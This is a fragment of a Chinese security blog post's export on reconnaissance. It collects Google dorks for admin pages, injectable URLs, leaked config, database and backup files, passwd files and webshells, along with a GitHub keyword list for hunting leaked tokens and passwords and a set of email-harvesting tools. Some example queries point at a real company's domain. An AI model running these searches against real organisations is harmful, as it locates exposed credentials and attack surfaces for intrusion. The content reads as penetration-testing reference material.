files\nhttps://www.google.com/search?q=site%3Aunited.com%20intitle%3Aindex.of%20%7C%20ext%3Alog%20%7C%20ext%3Aphp%20intitle%3Aphpinfo%20%5C%22published%20by%20the%20PHP%20Group%5C%22%20%7C%20inurl%3Ashell%20%7C%20inurl%3Abackdoor%20%7C%20inurl%3Awso%20%7C%20inurl%3Acmd%20%7C%20shadow%20%7C%20passwd%20%7C%20boot.ini%20%7C%20inurl%3Abackdoor%20%7C%20inurl%3Areadme%20%7C%20inurl%3Alicense%20%7C%20inurl%3Ainstall%20%7C%20inurl%3Asetup%20%7C%20inurl%3Aconfig%20%7C%20inurl%3A%5C%22%2Fphpinfo.php%5C%22%20%7C%20inurl%3A%5C%22.htaccess%5C%22%20%7C%20ext%3Aswf\n\n# Sub-subdomains\nhttps://www.google.com/search?q=site%3A*.*.united.com\n\n# Jenkins\nhttps://www.google.com/search?q=intitle%3A%5C%22Dashboard%20%5BJenkins%5D%5C%22%20%22united%22\n\n# Traefik\nhttps://www.google.com/search?q=intitle%3Atraefik%20inurl%3A8080%2Fdashboard%20%22united%22\n\n# Cloud buckets S3/GCP\nhttps://www.google.com/search?q=site%3A.s3.amazonaws.com%20%7C%20site%3Astorage.googleapis.com%20%7C%20site%3Aamazonaws.com%20%22united%22\n\n# SQL errors\nhttps://www.google.com/search?q=site%3Aunited.com%20intext%3A%5C%22sql%20syntax%20near%5C%22%20%7C%20intext%3A%5C%22syntax%20error%20has%20occurred%5C%22%20%7C%20intext%3A%5C%22incorrect%20syntax%20near%5C%22%20%7C%20intext%3A%5C%22unexpected%20end%20of%20SQL%20command%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20mysql_connect()%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20mysql_query()%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20pg_connect()%5C%22\n\n# Exposed documents\nhttps://www.google.com/search?q=site%3Aunited.com%20ext%3Adoc%20%7C%20ext%3Adocx%20%7C%20ext%3Aodt%20%7C%20ext%3Apdf%20%7C%20ext%3Artf%20%7C%20ext%3Asxw%20%7C%20ext%3Apsw%20%7C%20ext%3Appt%20%7C%20ext%3Apptx%20%7C%20ext%3Apps%20%7C%20ext%3Acsv\n\n# Wordpress files\nhttps://www.google.com/search?q=site%3Aunited.com%20inurl%3Awp-content%20%7C%20inurl%3Awp-includes\n\n# Apache Struts RCE\nhttps://www.google.com/search?q=site%3Aunited.com%20ext%3Aaction%20%7C%20ext%3Astruts%20%7C%20ext%3Ado\n\n# GitLab/GitHub/Bitbucket\nhttps://www.google.com/search?q=site%3Agithub.com%20%7C%20site%3Agitlab.com%20%7C%20site%3Abitbucket.org%20%22united%22\n\n# Subdomains\nhttps://www.google.com/search?q=site%3A*.united.com\n\n# Stackoverflow\nhttps://www.google.com/search?q=site%3Astackoverflow.com%20%22united.com%22\n\n# PHP errors\nhttps://www.google.com/search?q=site%3Aunited.com%20%5C%22PHP%20Parse%20error%5C%22%20%7C%20%5C%22PHP%20Warning%5C%22%20%7C%20%5C%22PHP%20Error%5C%22\n```\n## Github\n\n- Github高级搜索：https://github.com/search/advanced\n- GitDorker：https://github.com/obheda12/GitDorker\n- gitdorks_go：https://github.com/damit5/gitdorks_go\n\nkeywords：\n\n```\n\"token\"\n\"password\"\n\"secret\"\n\"passwd\"\n\"username\"\n\"key\"\n\"apidocs\"\n\"appspot\"\n\"auth\"\n\"aws_access\"\n\"config\"\n\"credentials\"\n\"dbuser\"\n\"ftp\"\n\"login\"\n\"mailchimp\"\n\"mailgun\"\n\"mysql\"\n\"pass\"\n\"pem private\"\n\"prod\"\n\"pwd\"\n\"secure\"\n\"ssh\"\n\"staging\"\n\"stg\"\n\"stripe\"\n\"swagger\"\n\"testuser\"\n\"jdbc\"\n```\n\n除了 Github 外，还有一些其他的代码平台：\n\n- GitLab: https://about.gitlab.com/\n- Gitee: https://gitee.com/\n- Bitbucket: https://bitbucket.org/\n\n## Stack Overflow\n\nStackoverflow：https://stackoverflow.com/\n\nStack Overflow 日志：\n- https://archive.org/details/stackexchange\n- https://archive.org/download/stackexchange\n\n敏感信息可能包括：\n- github key\n- 简历/邮箱/手机号\n\n## 社交平台\n\n结合 Google Search\n\n- 语雀：https://www.yuque.com/dashboard\n- 印象识堂：https://www.yinxiang.com/everhub/\n- wolai：https://www.wolai.com/\n- 腾讯文档：https://docs.qq.com\n- 飞书文档：https://docs.feishu.cn\n- 蓝湖：https://lanhuapp.com/\n\n## 历史页面\n\n- Wayback Machine：https://archive.org/web\n- waybackurls：https://github.com/tomnomnom/waybackurls\n- gau：https://github.com/lc/gau\n\n## 网盘\n\n- 搜索导航：e.g. https://adzhp.xyz/sites/3983.html\n- 聚合搜索：e.g. https://www.chaonengsou.com/\n- 蓝奏云：https://www.lanzoux.com\n- 天翼云：https://www.ctyun.cn\n- 阿里云盘：https://www.aliyundrive.com\n- 城通网盘：https://www.ctfile.com\n- 夸克网盘：https://pan.quark.cn\n- 新浪微盘\n\n## 邮箱\n\n- Hunter：https://hunter.io\n- Snov.io：https://app.snov.io\n- Phonebook：also works on subdomains and urls https://phonebook.cz\n- Skymem：https://www.skymem.info\n- email-format：https://www.email-format.com/i/search/\n- 搜邮箱：https://souyouxiang.com/find-contact/\n- theHarvester：also works on subdomains https://github.com/laramies/theHarvester\n\n### Hunter\n\n![](/images/信息收集-敏感信息收集/image-20231124162353785.png)\n\n### Snov.io\n\n![](/images/信息收集-敏感信息收集/image-20231124163506452.png)\n\n### Phonebook\n\n![](/images/信息收集-敏感信息收集/image-20231124163603784.png)\n\n### Skymem\n\n![](/images\\信息收集-敏感信息收集\\image-20231124163743384.png)\n\n### email-format\n\n![](/images/信息收集-敏感信息收集/image-20231124163836496.png)\n\n\n### 搜邮箱\n\n![](/images/信息收集-敏感信息收集/image-20231124163031668.png)\n\n\n### theHarvester\n\n![](/images/信息收集-敏感信息收集/image-20231124164253796.png)\n</style>\n","source":"_posts/信息收集-敏感信息收集.md","raw":"---\ntitle: 信息收集-敏感信息收集\ncover: https://img1.baidu.com/it/u=132799049,2544133620&fm=253&fmt=auto&app=120&f=JPEG?w=1422&h=800\nswiper_index: 10\ntop_group_index: 10\nbackground: '#fff'\ndate: 2025-03-20 10:14:19\nupdated:\ntags: 攻防知识\ncategories:\nkeywords:\ndescription:\ntop:\ntop_img:\ncomments:\ntoc:\ntoc_number:\ntoc_style_simple:\ncopyright:\ncopyright_author: 转载\ncopyright_author_href:\ncopyright_url:\ncopyright_info:\nmathjax:\nkatex:\naplayer:\nhighlight_shrink:\naside:\nai:\n---\n# 信息收集-敏感信息收集\n\n## Google\n\n- Google Hacking Database：https://www.exploit-db.com/google-hacking-database\n- Google Hacking：https://pentest-tools.com/information-gathering/google-hacking\n- Google Dork：https://cxsecurity.com/dorks/\n\n### 基础语法\n\n#### 管理后台地址\n\n```\nsite:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system\nsite:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend\nsite:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录\n```\n\n#### 上传类漏洞地址\n\n```\nsite:target.com inurl:file\nsite:target.com inurl:upload\n```\n\n#### 注入页面\n\n```\nsite:target.com inurl:?id=\nsite:target.com inurl:php?id=\n```\n\n#### 编辑器页面\n\n```\nsite:target.com inurl:ewebeditor\n```\n\n#### 目录遍历漏洞\n\n```\nsite:target.com intitle: \"index of\"\n```\n\n#### URL 跳转\n\n```\nsite:target.com inurl:url= | inurl:return= | inurl:next= | inurl:redir= inurl:http\n```\n\n#### SQL错误\n\n```\nsite:target.com intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:”Warning: mysql_query()\" | intext:\"Warning: pg_connect()\"\n```\n\n#### phpinfo\n\n```\nsite:target.com ext:php intitle:phpinfo \"published by the PHP Group\"\n```\n\n#### 配置文件泄露\n\n```\nsite:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini\n```\n\n#### 数据库文件泄露\n\n```\nsite:target.com ext:.sql | .dbf | .mdb | .db\n```\n\n#### 日志文件泄露\n\n```\nsite:target.com ext:.log\n```\n\n#### 备份和历史文件泄露\n\n```\nsite:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar\n```\n\n#### 公开文件泄露\n\n```\nsite:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv\n```\n\n#### 邮箱信息\n\n```\nsite:target.com intext:@target.com\nsite:target.com 邮件\nsite:target.com email\n```\n\n#### 社工信息\n\n```\nsite:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证\n```\n\n### Dorks\n\n```shell\n# Code share sites\nsite:http://ideone.com | site:http://codebeautify.org | site:http://codeshare.io | site:http://codepen.io | site:http://repl.it | site:http://jsfiddle.net \"company\"\n\n# GitLab/GitHub/Bitbucket\nsite:github.com | site:gitlab.com | site:bitbucket.org \"company\"\n\n# Stackoverflow\nsite:stackoverflow.com \"target.com\"\n\n# Project management sites\nsite:http://trello.com | site:*.atlassian.net \"company\"\n\n# Pastebin-like sites\nsite:http://justpaste.it | site:http://pastebin.com \"company\"\n\n# Config files\nsite:target.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:env | ext:ini\n\n# Database files\nsite:target.com ext:sql | ext:dbf | ext:mdb\n\n# Backup files\nsite:target.com ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup\n\n# .git folder\ninurl:\"/.git\" target.com -github\n\n# Exposed documents\nsite:target.com ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv\n\n# Other files\nsite:target.com intitle:index.of | ext:log | ext:php intitle:phpinfo \"published by the PHP Group\" | inurl:shell | inurl:backdoor | inurl:wso | inurl:cmd | shadow | passwd | boot.ini | inurl:backdoor | inurl:readme | inurl:license | inurl:install | inurl:setup | inurl:config | inurl:\"/phpinfo.php\" | inurl:\".htaccess\" | ext:swf\n\n# SQL errors\nsite:target.com intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:\"Warning: mysql_query()\" | intext:\"Warning: pg_connect()\"\n\n# PHP errors\nsite:target.com \"PHP Parse error\" | \"PHP Warning\" | \"PHP Error\"\n\n# Login pages\nsite:target.com inurl:signup | inurl:register | intitle:Signup\n\n# Open redirects\nsite:target.com inurl:redir | inurl:url | inurl:redirect | inurl:return | inurl:src=http | inurl:r=http\n\n# Apache Struts RCE\nsite:target.com ext:action | ext:struts | ext:do\n\n# Search in pastebin\nsite:pastebin.com target.com\n\n# Linkedin employees\nsite:linkedin.com employees target.com\n\n# Wordpress files\nsite:target.com inurl:wp-content | inurl:wp-includes\n\n# Subdomains\nsite:*.target.com\n\n# Sub-subdomains\nsite:*.*.target.com\n\n#Find S3 Buckets\nsite:.s3.amazonaws.com | site:http://storage.googleapis.com | site:http://amazonaws.com \"target\"\n\n# Traefik\nintitle:traefik inurl:8080/dashboard \"target\"\n\n# Jenkins\nintitle:\"Dashboard [Jenkins]\"\n\n# Other 3rd parties sites\nhttps://www.google.com/search?q=site%3Agitter.im%20%7C%20site%3Apapaly.com%20%7C%20site%3Aproductforums.google.com%20%7C%20site%3Acoggle.it%20%7C%20site%3Areplt.it%20%7C%20site%3Aycombinator.com%20%7C%20site%3Alibraries.io%20%7C%20site%3Anpm.runkit.com%20%7C%20site%3Anpmjs.com%20%7C%20site%3Ascribd.com%20%22united%22\n\n# Backup files\nhttps://www.google.com/search?q=site%3Aunited.com%20ext%3Abkf%20%7C%20ext%3Abkp%20%7C%20ext%3Abak%20%7C%20ext%3Aold%20%7C%20ext%3Abackup\n\n# Login pages\nhttps://www.google.com/search?q=site%3Aunited.com%20inurl%3Asignup%20%7C%20inurl%3Aregister%20%7C%20intitle%3ASignup\n\n# Config files\nhttps://www.google.com/search?q=site%3Aunited.com%20ext%3Axml%20%7C%20ext%3Aconf%20%7C%20ext%3Acnf%20%7C%20ext%3Areg%20%7C%20ext%3Ainf%20%7C%20ext%3Ardp%20%7C%20ext%3Acfg%20%7C%20ext%3Atxt%20%7C%20ext%3Aora%20%7C%20ext%3Aenv%20%7C%20ext%3Aini\n\n# .git folder\nhttps://www.google.com/search?q=inurl%3A%5C%22%2F.git%5C%22%20united.com%20-github\n\n# Database files\nhttps://www.google.com/search?q=site%3Aunited.com%20ext%3Asql%20%7C%20ext%3Adbf%20%7C%20ext%3Amdb\n\n# Open redirects\nhttps://www.google.com/search?q=site%3Aunited.com%20inurl%3Aredir%20%7C%20inurl%3Aurl%20%7C%20inurl%3Aredirect%20%7C%20inurl%3Areturn%20%7C%20inurl%3Asrc%3Dhttp%20%7C%20inurl%3Ar%3Dhttp\n\n# Code share sites\nhttps://www.google.com/search?q=site%3Asharecode.io%20%7C%20site%3Acontrolc.com%20%7C%20site%3Acodepad.co%20%7Csite%3Aideone.com%20%7C%20site%3Acodebeautify.org%20%7C%20site%3Ajsdelivr.com%20%7C%20site%3Acodeshare.io%20%7C%20site%3Acodepen.io%20%7C%20site%3Arepl.it%20%7C%20site%3Ajsfiddle.net%20%22united%22\n\n# Pastebin-like sites\nhttps://www.google.com/search?q=site%3Ajustpaste.it%20%7C%20site%3Aheypasteit.com%20%7C%20site%3Apastebin.com%20%22united%22\n\n# Linkedin employees\nhttps://www.google.com/search?q=site%3Alinkedin.com%20employees%20united.com\n\n#Project management sites\nhttps://www.google.com/search?q=site%3Atrello.com%20%7C%20site%3A*.atlassian.net%20%22united%22\n\n# Other files\nhttps://www.google.com/search?q=site%3Aunited.com%20intitle%3Aindex.of%20%7C%20ext%3Alog%20%7C%20ext%3Aphp%20intitle%3Aphpinfo%20%5C%22published%20by%20the%20PHP%20Group%5C%22%20%7C%20inurl%3Ashell%20%7C%20inurl%3Abackdoor%20%7C%20inurl%3Awso%20%7C%20inurl%3Acmd%20%7C%20shadow%20%7C%20passwd%20%7C%20boot.ini%20%7C%20inurl%3Abackdoor%20%7C%20inurl%3Areadme%20%7C%20inurl%3Alicense%20%7C%20inurl%3Ainstall%20%7C%20inurl%3Asetup%20%7C%20inurl%3Aconfig%20%7C%20inurl%3A%5C%22%2Fphpinfo.php%5C%22%20%7C%20inurl%3A%5C%22.htaccess%5C%22%20%7C%20ext%3Aswf\n\n# Sub-subdomains\nhttps://www.google.com/search?q=site%3A*.*.united.com\n\n# Jenkins\nhttps://www.google.com/search?q=intitle%3A%5C%22Dashboard%20%5BJenkins%5D%5C%22%20%22united%22\n\n# Traefik\nhttps://www.google.com/search?q=intitle%3Atraefik%20inurl%3A8080%2Fdashboard%20%22united%22\n\n# Cloud buckets S3/GCP\nhttps://www.google.com/search?q=site%3A.s3.amazonaws.com%20%7C%20site%3Astorage.googleapis.com%20%7C%20site%3Aamazonaws.com%20%22united%22\n\n# SQL errors\nhttps://www.google.com/search?q=site%3Aunited.com%20intext%3A%5C%22sql%20syntax%20near%5C%22%20%7C%20intext%3A%5C%22syntax%20error%20has%20occurred%5C%22%20%7C%20intext%3A%5C%22incorrect%20syntax%20near%5C%22%20%7C%20intext%3A%5C%22unexpected%20end%20of%20SQL%20command%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20mysql_connect()%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20mysql_query()%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20pg_connect()%5C%22\n\n# Exposed documents\nhttps://www.google.com/search?q=site%3Aunited.com%20ext%3Adoc%20%7C%20ext%3Adocx%20%7C%20ext%3Aodt%20%7C%20ext%3Apdf%20%7C%20ext%3Artf%20%7C%20ext%3Asxw%20%7C%20ext%3Apsw%20%7C%20ext%3Appt%20%7C%20ext%3Apptx%20%7C%20ext%3Apps%20%7C%20ext%3Acsv\n\n# Wordpress files\nhttps://www.google.com/search?q=site%3Aunited.com%20inurl%3Awp-content%20%7C%20inurl%3Awp-includes\n\n# Apache Struts RCE\nhttps://www.google.com/search?q=site%3Aunited.com%20ext%3Aaction%20%7C%20ext%3Astruts%20%7C%20ext%3Ado\n\n# GitLab/GitHub/Bitbucket\nhttps://www.google.com/search?q=site%3Agithub.com%20%7C%20site%3Agitlab.com%20%7C%20site%3Abitbucket.org%20%22united%22\n\n# Subdomains\nhttps://www.google.com/search?q=site%3A*.united.com\n\n# Stackoverflow\nhttps://www.google.com/search?q=site%3Astackoverflow.com%20%22united.com%22\n\n# PHP errors\nhttps://www.google.com/search?q=site%3Aunited.com%20%5C%22PHP%20Parse%20error%5C%22%20%7C%20%5C%22PHP%20Warning%5C%22%20%7C%20%5C%22PHP%20Error%5C%22\n```\n## Github\n\n- Github高级搜索：https://github.com/search/advanced\n- GitDorker：https://github.com/obheda12/GitDorker\n- gitdorks_go：https://github.com/damit5/gitdorks_go\n\nkeywords：\n\n```\n\"token\"\n\"password\"\n\"secret\"\n\"passwd\"\n\"username\"\n\"key\"\n\"apidocs\"\n\"appspot\"\n\"auth\"\n\"aws_access\"\n\"config\"\n\"credentials\"\n\"dbuser\"\n\"ftp\"\n\"login\"\n\"mailchimp\"\n\"mailgun\"\n\"mysql\"\n\"pass\"\n\"pem private\"\n\"prod\"\n\"pwd\"\n\"secure\"\n\"ssh\"\n\"staging\"\n\"stg\"\n\"stripe\"\n\"swagger\"\n\"testuser\"\n\"jdbc\"\n```\n\n除了 Github 外，还有一些其他的代码平台：\n\n- GitLab: https://about.gitlab.com/\n- Gitee: https://gitee.com/\n- Bitbucket: https://bitbucket.org/\n\n## Stack Overflow\n\nStackoverflow：https://stackoverflow.com/\n\nStack Overflow 日志：\n- https://archive.org/details/stackexchange\n- https://archive.org/download/stackexchange\n\n敏感信息可能包括：\n- github key\n- 简历/邮箱/手机号\n\n## 社交平台\n\n结合 Google Search\n\n- 语雀：https://www.yuque.com/dashboard\n- 印象识堂：https://www.yinxiang.com/everhub/\n- wolai：https://www.wolai.com/\n- 腾讯文档：https://docs.qq.com\n- 飞书文档：https://docs.feishu.cn\n- 蓝湖：https://lanhuapp.com/\n\n## 历史页面\n\n- Wayback Machine：https://archive.org/web\n- waybackurls：https://github.com/tomnomnom/waybackurls\n- gau：https://github.com/lc/gau\n\n## 网盘\n\n- 搜索导航：e.g. https://adzhp.xyz/sites/3983.html\n- 聚合搜索：e.g. https://www.chaonengsou.com/\n- 蓝奏云：https://www.lanzoux.com\n- 天翼云：https://www.ctyun.cn\n- 阿里云盘：https://www.aliyundrive.com\n- 城通网盘：https://www.ctfile.com\n- 夸克网盘：https://pan.quark.cn\n- 新浪微盘\n\n## 邮箱\n\n- Hunter：https://hunter.io\n- Snov.io：https://app.snov.io\n- Phonebook：also works on subdomains and urls https://phonebook.cz\n- Skymem：https://www.skymem.info\n- email-format：https://www.email-format.com/i/search/\n- 搜邮箱：https://souyouxiang.com/find-contact/\n- theHarvester：also works on subdomains https://github.com/laramies/theHarvester\n\n### Hunter\n\n![](/images/信息收集-敏感信息收集/image-20231124162353785.png)\n\n### Snov.io\n\n![](/images/信息收集-敏感信息收集/image-20231124163506452.png)\n\n### Phonebook\n\n![](/images/信息收集-敏感信息收集/image-20231124163603784.png)\n\n### Skymem\n\n![](/images\\信息收集-敏感信息收集\\image-20231124163743384.png)\n\n### email-format\n\n![](/images/信息收集-敏感信息收集/image-20231124163836496.png)\n\n\n### 搜邮箱\n\n![](/images/信息收集-敏感信息收集/image-20231124163031668.png)\n\n\n### theHarvester\n\n![](/images/信息收集-敏感信息收集/image-20231124164253796.png)\n</style>\n","slug":"信息收集-敏感信息收集","published":1,"layout":"post","photos":[],"_id":"cm8iuwsr70008rcn10xwu5x13","content":"<h1 id=\"信息收集-敏感信息收集\"><a href=\"#信息收集-敏感信息收集\" class=\"headerlink\" title=\"信息收集-敏感信息收集\"></a>信息收集-敏感信息收集</h1><h2 id=\"Google\"><a href=\"#Google\" class=\"headerlink\" title=\"Google\"></a>Google</h2><ul>\n<li>Google Hacking Database：<a href=\"https://www.exploit-db.com/google-hacking-database\">https://www.exploit-db.com/google-hacking-database</a></li>\n<li>Google Hacking：<a href=\"https://pentest-tools.com/information-gathering/google-hacking\">https://pentest-tools.com/information-gathering/google-hacking</a></li>\n<li>Google Dork：<a href=\"https://cxsecurity.com/dorks/\">https://cxsecurity.com/dorks/</a></li>\n</ul>\n<h3 id=\"基础语法\"><a href=\"#基础语法\" class=\"headerlink\" title=\"基础语法\"></a>基础语法</h3><h4 id=\"管理后台地址\"><a href=\"#管理后台地址\" class=\"headerlink\" title=\"管理后台地址\"></a>管理后台地址</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system</span><br><span class=\"line\">site:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend</span><br><span class=\"line\">site:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"上传类漏洞地址\"><a href=\"#上传类漏洞地址\" class=\"headerlink\" title=\"上传类漏洞地址\"></a>上传类漏洞地址</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com inurl:file</span><br><span class=\"line\">site:target.com inurl:upload</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"注入页面\"><a href=\"#注入页面\" class=\"headerlink\" title=\"注入页面\"></a>注入页面</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com inurl:?id=</span><br><span class=\"line\">site:target.com inurl:php?id=</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"编辑器页面\"><a href=\"#编辑器页面\" class=\"headerlink\" title=\"编辑器页面\"></a>编辑器页面</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com inurl:ewebeditor</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"目录遍历漏洞\"><a href=\"#目录遍历漏洞\" class=\"headerlink\" title=\"目录遍历漏洞\"></a>目录遍历漏洞</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com intitle: &quot;index of&quot;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"URL-跳转\"><a href=\"#URL-跳转\" class=\"headerlink\" title=\"URL 跳转\"></a>URL 跳转</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com inurl:url= | inurl:return= | inurl:next= | inurl:redir= inurl:http</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"SQL错误\"><a href=\"#SQL错误\" class=\"headerlink\" title=\"SQL错误\"></a>SQL错误</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:”Warning: mysql_query()&quot; | intext:&quot;Warning: pg_connect()&quot;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"phpinfo\"><a href=\"#phpinfo\" class=\"headerlink\" title=\"phpinfo\"></a>phpinfo</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com ext:php intitle:phpinfo &quot;published by the PHP Group&quot;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"配置文件泄露\"><a href=\"#配置文件泄露\" class=\"headerlink\" title=\"配置文件泄露\"></a>配置文件泄露</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"数据库文件泄露\"><a href=\"#数据库文件泄露\" class=\"headerlink\" title=\"数据库文件泄露\"></a>数据库文件泄露</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com ext:.sql | .dbf | .mdb | .db</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"日志文件泄露\"><a href=\"#日志文件泄露\" class=\"headerlink\" title=\"日志文件泄露\"></a>日志文件泄露</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com ext:.log</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"备份和历史文件泄露\"><a href=\"#备份和历史文件泄露\" class=\"headerlink\" title=\"备份和历史文件泄露\"></a>备份和历史文件泄露</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"公开文件泄露\"><a href=\"#公开文件泄露\" class=\"headerlink\" title=\"公开文件泄露\"></a>公开文件泄露</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"邮箱信息\"><a href=\"#邮箱信息\" class=\"headerlink\" title=\"邮箱信息\"></a>邮箱信息</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com intext:@target.com</span><br><span class=\"line\">site:target.com 邮件</span><br><span class=\"line\">site:target.com email</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"社工信息\"><a href=\"#社工信息\" class=\"headerlink\" title=\"社工信息\"></a>社工信息</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Dorks\"><a href=\"#Dorks\" class=\"headerlink\" title=\"Dorks\"></a>Dorks</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span 